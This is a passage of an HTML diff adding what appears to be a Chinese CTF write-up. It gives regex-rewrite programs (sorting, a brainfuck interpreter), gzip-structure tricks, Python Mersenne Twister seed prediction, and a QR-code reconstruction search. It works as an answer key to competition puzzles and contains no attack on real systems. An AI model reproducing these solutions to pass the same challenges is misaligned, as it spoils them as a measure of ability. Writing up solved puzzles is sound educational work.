+    Replace(False, r&#39;([abcd])\1{8}&#39;, r&#39;8&#39;),
+    Replace(False, r&#39;([abcd])\1{7}&#39;, r&#39;7&#39;),
+    Replace(False, r&#39;([abcd])\1{6}&#39;, r&#39;6&#39;),
+    Replace(False, r&#39;([abcd])\1{5}&#39;, r&#39;5&#39;),
+    Replace(False, r&#39;([abcd])\1{4}&#39;, r&#39;4&#39;),
+    Replace(False, r&#39;([abcd])\1{3}&#39;, r&#39;3&#39;),
+    Replace(False, r&#39;([abcd])\1{2}&#39;, r&#39;2&#39;),
+    Replace(False, r&#39;([abcd])\1{1}&#39;, r&#39;1&#39;),
+    Replace(False, r&#39;([abcd])&#39;, r&#39;0&#39;),
+
+    Replace(True, r&#39;^0&#39;, r&#39;&#39;),
+    Replace(False, r&#39;^$&#39;, r&#39;0&#39;),
+];
+</code></pre>
+<p>Flag2: 用一个特殊的字符分隔输入的字符串。然后不断判断相邻的两个字符串的长度是否满足降序的要求，如果不满足，则交换这两个字符串。不断的重复这个过程，直到无法替换就完成了字符串的排序。 这里有一个问题是如何比较字符串的长度呢？我把并把原来的字符串备份一份，用一个特殊字符来分隔原来的字符串和新的字符串，并把新的备份全部替换成字母a。这样，我们比较字符串长度的问题就变成了比较a的个数。 可以用 <code>(a*)a+分隔符\1</code> 这种形式来判断前面的字符串是否比后面的长。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span></span><code class="language-python">prog = [
+    Replace(True, r&#39;\n\n&#39;, r&#39;\n&#39;),
+    Replace(False, r&#39;\n|$|^&#39;, r&#39;⭕️&#39;),
+    Replace(True, r&#39;⭕️([^⭕️👀]+)⭕️&#39;, r&#39;⭕️\1👀\1⭕️&#39;),
+    Replace(True, r&#39;⭕️([^⭕️👀]*)[^⭕️👀a]([^⭕️👀]*)👀([^⭕️👀]+)⭕️&#39;, r&#39;⭕️\1a\2👀\3⭕️&#39;),
+    Replace(True, r&#39;⭕️(a+)(a+)👀([^⭕️👀]+)⭕️\1👀([^⭕️👀]+)⭕️&#39;, r&#39;⭕️\1👀\4⭕️\1\2👀\3⭕️&#39;),
+    Replace(False, r&#39;⭕️([^⭕️👀]*)👀([^⭕️👀]+)&#39;, r&#39;\2\n&#39;),
+    Replace(False, r&#39;⭕️&#39;, r&#39;&#39;),
+];
+</code></pre>
+<p>Flag3: 用字符串表达 brainfuck 的状态机，状态机包括三个部分：代码（及代码游标），内存（及内存游标），输出。我们有很多可用的 emoji 字符来进行不同部分的分割和游标的表示。</p>
+<pre><span class="line-number"><span>1</span><span>2</span><span>3</span><span>4</span><span>5</span><span>6</span><span>7</span><span>8</span><span>9</span><span>10</span><span>11</span><span>12</span><span>13</span><span>14</span><span>15</span><span>16</span><span>17</span><span>18</span><span>19</span><span>20</span><span>21</span><span>22</span><span>23</span><span>24</span><span>25</span><span>26</span><span>27</span><span>28</span><span>29</span><span>30</span><span>31</span><span>32</span><span>33</span><span>34</span><span>35</span><span>36</span><span>37</span><span>38</span><span>39</span><span>40</span><span>41</span><span>42</span><span>43</span><span>44</span><span>45</span><span>46</span><span>47</span><span>48</span><span>49</span><span>50</span><span>51</span><span>52</span><span>53</span><span>54</span><span>55</span><span>56</span><span>57</span><span>58</span><span>59</span><span>60</span><span>61</span><span>62</span><span>63</span><span>64</span><span>65</span><span>66</span><span>67</span><span>68</span><span>69</span><span>70</span><span>71</span><span>72</span><span>73</span><span>74</span><span>75</span><span>76</span><span>77</span><span>78</span><span>79</span><span>80</span><span>81</span><span>82</span><span>83</span><span>84</span><span>85</span><span>86</span><span>87</span><span>88</span><span>89</span><span>90</span><span>91</span><span>92</span><span>93</span><span>94</span><span>95</span><span>96</span><span>97</span><span>98</span><span>99</span><span>100</span><span>101</span><span>102</span><span>103</span><span>104</span><span>105</span><span>106</span><span>107</span></span><code class="language-python">def gen(a, b):
+    ret = []
+    for i in range(b,a-1,-1):
+        c = chr(i) if chr(i) != &quot;\\&quot; else &quot;\\\\&quot;
+        ret.append(Replace(False, f&#39;🏹(.*)✨(a{{{i}}})🎃&#39;, f&#39;{c}🏹\\1✨\\2🎃&#39;))
+    return ret
+
+prog = [
+    # Remove comments
+    Replace(False, r&#39;\n&#39;, r&#39;&#39;),
+    Replace(False, r&#39;[^\[\].+-&lt;&gt;]&#39;, r&#39;&#39;),
+    Replace(False, r&#39;\d&#39;, r&#39;&#39;),
+    Replace(False, r&#39;[;:]&#39;, r&#39;&#39;),
+
+    Replace(False, r&#39;^(.*)$&#39;, r&#39;🎈\1🎠🏹✨🎃✨🎉&#39;),
+
+    Branch(False, r&#39;🎈&#39;, &quot;Start2&quot;),
+
+    &quot;Start&quot;,
+    Replace(False, r&#39;🎈(.)&#39;, r&quot;\1🎈&quot;),
+
+    &quot;Start2&quot;,
+    Branch(False, r&#39;🎈🎠&#39;, &quot;End&quot;),
+    Branch(False, r&#39;🎈\+&#39;, &quot;OP+&quot;),
+    Branch(False, r&#39;🎈-&#39;, &quot;OP-&quot;),
+    Branch(False, r&#39;🎈&gt;&#39;, &quot;OP&gt;&quot;),
+    Branch(False, r&#39;🎈&lt;&#39;, &quot;OP&lt;&quot;),
+    Branch(False, r&#39;🎈\[&#39;, &quot;OP[&quot;),
+    Branch(False, r&#39;🎈]&#39;, &quot;OP]&quot;),
+    Branch(False, r&#39;🎈.&#39;, &quot;OP.&quot;),
+
+    &quot;OP+&quot;,
+    Replace(False, r&#39;✨(a*)🎃&#39;, r&#39;✨a\1🎃&#39;),
+    Branch(False, r&#39;🎈&#39;, &quot;Start&quot;),
+
+    &quot;OP-&quot;,
+    Replace(False, r&#39;✨a(a*)🎃&#39;, r&#39;✨\1🎃&#39;),
+    Branch(False, r&#39;🎈&#39;, &quot;Start&quot;),
+
+    &quot;OP&gt;&quot;,
+    Replace(False, r&#39;🎃$&#39;, r&#39;🎃✨🎉&#39;),
+    Replace(False, r&#39;✨(a*)🎃✨(a*)🎉&#39;, r&#39;✨\1🎉✨\2🎃&#39;),
+    Branch(False, r&#39;🎈&#39;, &quot;Start&quot;),
+
+    &quot;OP&lt;&quot;,
+    Replace(False, r&#39;🏹✨(a*)🎃&#39;, r&#39;🏹✨🎉✨\1🎃&#39;),
+    Replace(False, r&#39;✨(a*)🎉✨(a*)🎃&#39;, r&#39;✨\1🎃✨\2🎉&#39;),
+    Branch(False, r&#39;🎈&#39;, &quot;Start&quot;),
+
+    &quot;OP[&quot;,
+    Branch(False, r&#39;✨a+🎃&#39;, &quot;Start&quot;),
+    # Jump past the matching ] if the cell at the pointer is 0
+
+        Replace(False, r&#39;$&#39;, r&#39;🎨&#39;),
+        &quot;OP[-dispatch&quot;,
+
+        Branch(False, r&#39;🎈\[&#39;, &quot;OP[-[&quot;),
+        Branch(False, r&#39;🎈]&#39;, &quot;OP[-]&quot;),
+
+        &quot;OP[-other&quot;,
+
+        Replace(False, r&#39;🎈(.)&#39;, r&quot;\1🎈&quot;),
+        Branch(False, r&#39;🎈&#39;, &quot;OP[-dispatch&quot;),
+
+        &quot;OP[-[&quot;,
+        Replace(False, r&#39;🎨(.*)$&#39;, r&#39;🎨X\1&#39;),
+        Branch(False, r&#39;🎈&#39;, &quot;OP[-other&quot;),
+
+        &quot;OP[-]&quot;,
+        Replace(False, r&#39;🎨X(.*)$&#39;, r&#39;🎨\1&#39;),
+        Replace(False, r&#39;🎨$&#39;, r&#39;&#39;),
+        Branch(True, r&#39;🎨&#39;, &quot;Start&quot;),
+        Branch(False, r&#39;🎈&#39;, &quot;OP[-other&quot;),
+
+    &quot;OP]&quot;,
+    Branch(False, r&#39;✨🎃&#39;, &quot;Start&quot;),
+    # Jump back to the matching [ if the cell at the pointer is nonzero
+
+        Replace(False, r&#39;$&#39;, r&#39;🎨&#39;),
+        &quot;OP]-dispatch&quot;,
+
+        Branch(False, r&#39;🎈\[&#39;, &quot;OP]-[&quot;),
+        Branch(False, r&#39;🎈]&#39;, &quot;OP]-]&quot;),
+
+        &quot;OP]-other&quot;,
+
+        Replace(False, r&#39;(.)🎈&#39;, r&quot;🎈\1&quot;),
+        Branch(False, r&#39;🎈&#39;, &quot;OP]-dispatch&quot;),
+
+        &quot;OP]-]&quot;,
+        Replace(False, r&#39;🎨(.*)$&#39;, r&#39;🎨X\1&#39;),
+        Branch(False, r&#39;🎈&#39;, &quot;OP]-other&quot;),
+
+        &quot;OP]-[&quot;,
+        Replace(False, r&#39;🎨X(.*)$&#39;, r&#39;🎨\1&#39;),
+        Replace(False, r&#39;🎨$&#39;, r&#39;&#39;),
+        Branch(True, r&#39;🎨&#39;, &quot;Start&quot;),
+        Branch(False, r&#39;🎈&#39;, &quot;OP]-other&quot;),
+
+    &quot;OP.&quot;,
+] + gen(32,122) + [
+    Branch(False, r&#39;🎈&#39;, &quot;Start&quot;),
+
+    &quot;End&quot;,
+    # Replace(False, r&#39;🎠&#39;, r&#39;\1&#39;),
+    Replace(False, r&#39;^.*🎠(.*)🏹.*$&#39;, r&#39;\1&#39;),
+];
+</code></pre>
+</section><section>
+<h3>未来磁盘</h3>
+<p>为了方便表述，做以下记号约定：f0 是完全未被压缩的包含 flag 的文件，f1 是压缩 f0 得到的文件，f2 是压缩 f1 得到的文件。这个问题的关键是要了解 gzip 的算法，需要阅读 RFC 1951 和 1952。</p>
+<p>Flag1:  解压出 f1 文件，大小约 8 GiB。修改<a href="https://github.com/emmanuel-marty/em_inflate">标准的解压算法</a>使其只输出 alphabet （术语来自 RFC），不输出 &lt;length, backward distance&gt; 即可。运行修改后的算法即可得到 flag。</p>
+<p>Flag2:  解压出 f2 文件，大小约 40 GiB。观察到文件中有很如同 &lt;258, 16433&gt;, &lt;258, 1&gt;, &lt;258, 1&gt;, ..., &lt;258, 1&gt;，&lt;238或239, 1&gt; 的模式（这里 &lt;a,b&gt; 表示 &lt;length, backward distance&gt;），每一个模式对应 f1 中的一个 compressed block。我们修改标准的解压算法，找到第一个不遵循这个模式的 compressed block，然后用 flag1 的方法解压这个 block 即可得到 flag2。</p>
+</section><section>
+<h3>扫雷III</h3>
+<p>没做出来。简单看了一下解答，很有趣，是用扫雷构造的电路。Matrix67 写过一篇有趣的文章<span class="sidenote-anchor"></span><span class="sidenote"><a href="http://www.matrix67.com/blog/archives/544">Matrix67 经典证明：扫雷是NP完全问题</a></span>。最早的研究应该是这篇学术文章<span class="sidenote-anchor"></span><span class="sidenote">Minesweeper is NP-complete (2000). <a href="https://web.mat.bham.ac.uk/R.W.Kaye/minesw/ASE2003.pdf">Slides</a></span>。</p>
+</section><section>
+<h3>小章鱼的曲奇</h3>
+<p>Flag1: 调用<a href="https://github.com/kmyk/mersenne-twister-predictor">mersenne-twister-predictor</a>。</p>
+<p>Flag2: 阅读 cpython 的代码可知，种子是会被取绝对值的。因此直接令 seed2 = - seed1。</p>
+<p>Flag3: 好像出题人疏忽了，直接重复输入种子即可。</p>
+</section><section>
+<h3>华维码</h3>
+<p>Flag1: 搜索所有可能的摆放方式，并检查生成的二维码能否被正确扫描。</p>
+<p>Flag2: 搜索所有可能的摆放方式，并检查生成的二维码能否被正确扫描。这个问题的关键是要了解二维码的编码方式，并进行搜索剪枝。我阅读了<a href="https://www.thonky.com/qr-code-tutorial/">教程</a>。理解编码方式之后，可以采用以下两个搜索剪枝方案：</p>
+<p>方案一：答案用 Byte Mode Encoding（因为其他编码方式都不能实现网址或者 <code>flag{xxx}</code>  字符串的编码）。加入这个剪枝之后，我们可以知道最终的字符串的长度是 63。</p>
+<p>方案二：二维码中有很多点我们是能够确定是什么的，这就约束了某个块能够摆放的位置。在搜索的过程中，我们优先搜索摆放位置数量最少的块。我一共使用了两种方法来确定已知点。第一，定位块和对齐线是已知的，那么它们所在的点也是能确定的。第二，在 Version 7-L 中，一共有两个 blocks，每个 block 可以放 78 个 crosswords （这里的数据和术语都是来自前面说的教程），因为最终的字符串的长度是 63，小于 78-2 （-2 是因为要放置 Encoding Mode, Bytes Length 和 End of Bytes），所以第二个 block 是空的，也就是用 11101100 00010001 进行填充的（教程里说的用此 padding 填充不够长的数据）。所以我们能够确定第二个 block 对应的点。</p>
+<p>解出二维码后，得到一个 <a href="https://gist.github.com/Konano/e9f437ecc94b20005ee6defdd7d46834">gist 链接</a>，但进去后并没有 flag 的内容。我猜是出题人想我们玩一下 9X9 的格子华容道。我在网上找了一个<a href="https://zhuanlan.zhihu.com/p/120931476">华容道开源代码</a>，并把它修改成9x9的游戏模式，手动玩一遍果然可得到 flag。</p>
+<p>这题写了很长的代码，主要是一个苦力活，有很多细节要处理（比如要生成 crosswords 以 zigzag pattern 摆放的序列）。</p>
+
+                </section>
+                <footer>
+                </footer>
+            </main>
+        </div>
+        <script src="/js/script.js"></script>
+    </body>
+</html>
